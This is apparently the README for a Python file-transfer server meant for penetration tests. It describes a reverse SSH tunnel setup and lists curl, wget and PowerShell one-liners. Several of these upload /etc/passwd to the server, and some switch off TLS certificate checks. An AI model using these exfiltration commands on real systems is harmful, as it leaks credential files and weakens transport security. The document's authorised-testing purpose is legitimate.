# p3u - Python 3 Uploader

# Purpose
I needed a flexible and simple file upload and download tool with SSL support for local use at customer site during penetration tests.
So I stumbled over the gist files already implementing it and modified them for my needs.

Feel free to contribute with PRs.

# Script Usage
Use the following arguments: \
`p3u.py -l ip -p port -a user:password -c server.pem`

Generate your cert with \
`p3u.py -g`

Use remote Box for reverse proxy and ssl offloading:
1. Configure your server with Let's Encrypt and nginx
2. Add to the nginx.conf
```
location / {
        proxy_pass http://127.0.0.1:5555/;
}
```
3. Connect to the server via SSH to establish the tunnel:
```
ssh -nNT -4 -R 5555:localhost:80 user@server -v
```
4. Run p3u.py

This will handle and offload SSL connections on the server with certbot or similar without the need to run the challenge locally.

# Data transfer examples

# Download and Upload from Browser
## Browser
```
Click, Click, Done
```

# Downloading from Linux

## wget
```shell
wget https://127.0.0.1:8888/file [--no-check-certificate] [--http-user user --http-password password]
```

## curl
```shell
curl https://127.0.0.1:8888/file -O [--insecure] [--user user:password]
```

# Uploading from Linux
## curl
```shell
curl -F 'file=@/etc/passwd' [https://]127.0.0.1:8888 [--user user:password] [--insecure]
```

## wget
(This one was fun to build)
```shell
filename=/etc/passwd && echo -e "----FILEUPLOAD\r\nContent-Disposition: form-data; name=\"file\"; filename=\"$filename\"\r\n" > /tmp/xyz-upload && cat $filename >> /tmp/xyz-upload && echo -e '\r\n----FILEUPLOAD--\r\n' >> /tmp/xyz-upload && wget --header="Content-type: multipart/form-data; boundary=--FILEUPLOAD" --post-file /tmp/xyz-upload [https://]127.0.0.1:8888 -qO- [--http-user user --http-password password] [--no-check-certificate] && rm /tmp/xyz-upload
```

# Downloading from Windows

## Powershell without authentication w/ .Net
```powershell
$url="http[s]://127.0.0.1:8888/file"; (New-Object System.Net.WebClient).DownloadFile($url,$url.Substring($url.LastIndexOf("/") + 1))
```

## Powershell without authentication w/o .Net
-SkipCertificateCheck is quite new: https://github.com/PowerShell/PowerShell/pull/2006
```powershell
$url="https://127.0.0.1:8888/passwd"; Invoke-WebRequest $url -OutFile $url.Substring($url.LastIndexOf("/") + 1) [-SkipCertificateCheck]
```

## Handling invalid certificates in .Net
```powershell
Add-Type -Language CSharp "namespace System.Net {public static class Util {public static void Init() {ServicePointManager.ServerCertificateValidationCallback = null;ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, errs) => true;}}}"; [System.Net.Util]::Init();
<insert one of the powershell .Net payloads here>
```

# Uploading stuff from Windows

## Powershell without authentication w/ .Net
```powershell
(New-Object Net.WebClient).UploadFile("http[s]://127.0.0.1:8888","/etc/passwd")
```

## Powershell with authentication w/ .Net
```powershell
$wc = New-Object System.Net.WebClient; $wc.Credentials = new-object System.Net.NetworkCredential("user","password"); $resp = $wc.UploadFile("http[s]://127.0.0.1:8888","/etc/passwd")
```

# Handling invalid certificates in .Net
```powershell
Add-Type -Language CSharp "namespace System.Net {public static class Util {public static void Init() {ServicePointManager.ServerCertificateValidationCallback = null;ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, errs) => true;}}}"; [System.Net.Util]::Init();
<insert one of the powershell payloads here>
```

## Credits
UniIsland & 4d4c for their initial work
